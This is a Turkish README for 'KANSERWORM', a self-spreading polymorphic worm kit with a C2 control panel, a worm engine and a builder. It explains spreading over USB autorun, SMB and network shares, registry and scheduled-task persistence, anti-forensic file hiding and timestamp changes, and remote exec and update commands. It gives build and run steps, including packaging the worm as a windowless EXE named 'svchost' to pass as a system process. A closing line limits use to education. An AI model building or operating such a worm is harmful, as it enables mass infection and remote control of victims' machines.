# KANSERWORM v1.0

Kendi kendine yayilan polimorfik solucan. Her yayilmada kod yapisini degistirir (polimorfizm), C2 uzerinden uzaktan kontrol edilir. USB, SMB, network share ve phishing vektorleriyle yayilir.

---

## Dosya Yapisi

| Dosya | Aciklama |
|-------|----------|
| `server.py` | Worm C2 kontrol paneli (GUI) — yayilma takibi, enfekte host listesi, uzaktan komut |
| `core.py` | Polimorfik solucan motoru — kendini kopyalama, yayilma, C2 iletisim, kod mutasyonu |
| `builder.py` | Worm EXE builder — ilk yayilma vektoru olusturma |
| `config.json` | Worm yapilandirmasi — C2 adresi, port, yayilma araligi, polimorfizm araligi |

---

## Ozellikler

- **Polimorfizm** — Her `POLYMORPH_INTERVAL` (varsayilan 300sn) sonunda kaynak kod degistirilir (degisken isimleri, string encoding, kod siralamasi)
- **Kendi Kendine Yayilma** — Her `SPREAD_INTERVAL` (varsayilan 60sn) sonunda:
  - **USB Yayilma** — Takili USB suruculere kopyalanir, `autorun.inf` olusturur
  - **SMB Yayilma** — Agdaki SMB paylasimlarini tarar, yazilabilir olanlara kopyalanir
  - **Network Share** — Acik ag paylasimlarina kendini kopyalar
- **C2 Kontrol** — Base64 kodlu komut kanali:
  - `scan` — Ag taramasi yap
  - `spread` — Zorla yayilma baslat
  - `exec` — Uzaktan komut calistir
  - `update` — Yeni worm versiyonu indir ve guncelle
  - `die` — Worm'u durdur ve temizle
- **Persistence** — Registry + Scheduled Task + Startup klasoru
- **Anti-Forensic** — Kendi dosyasini gizler, zaman damgalarini degistirir
- **SQLite Veritabani** — Tum enfekte hostlar ve yayilma loglari

---

## Gereksinimler

```bash
cd KanserTools
pip install -r requirements.txt
```

---

## Kullanim

### 1. C2 Kontrol Paneli

```bash
cd worm
python server.py
```

GUI acilir. Varsayilan port: `7777`. Panel ozellikleri:
- **Worms** sekmesi: Enfekte host listesi, IP, OS, worm versiyonu, yayilma sayisi
- **Console** sekmesi: Secili worm'a uzaktan komut gonder
- **Logs** sekmesi: Tum yayilma ve hata loglari

### 2. Worm Motoru

```bash
# Direkt calistirma (test amacli):
python core.py

# config.json icinde C2_HOST ve C2_PORT ayarlanmalidir
```

Worm calistiginda:
1. C2 sunucuya baglanir, benzersiz WORM_ID uretir
2. Sistem bilgisini gonderir
3. Persistence kurar
4. Yayilma dongusune girer (USB + SMB + Network)
5. Polimorfizm dongusune girer (kod mutasyonu)
6. C2'den komut bekler

### 3. Builder

```bash
python builder.py
```

C2 adresi ve port girilir, `worm_built.py` olusturulur.

---

## EXE Builder (PyInstaller)

```bash
cd worm

# Worm motorunu EXE yap:
pyinstaller --onefile --noconsole --name=svchost core.py

# C2 sunucuyu EXE yap:
pyinstaller --onefile --name=WormC2 server.py
```

---

## Monitor Reporter

`monitor_reporter.py`, worm motoru calistiginda otomatik import edilir. Yeni enfeksiyon, yayilma basarisi, polimorfizm tetiklenmesi, hata durumlari merkezi olarak raporlanir.

```python
from monitor_reporter import report
report("Worm", "spread_usb", {"drive": "E:", "hosts_infected": 3})
```

---

## Guvenlik Uyarisi

Bu arac **yalnizca kendi sistemlerinizde ve egitim/test amaciyla** kullanilmalidir. Izinsiz kullanim yasa disidir.
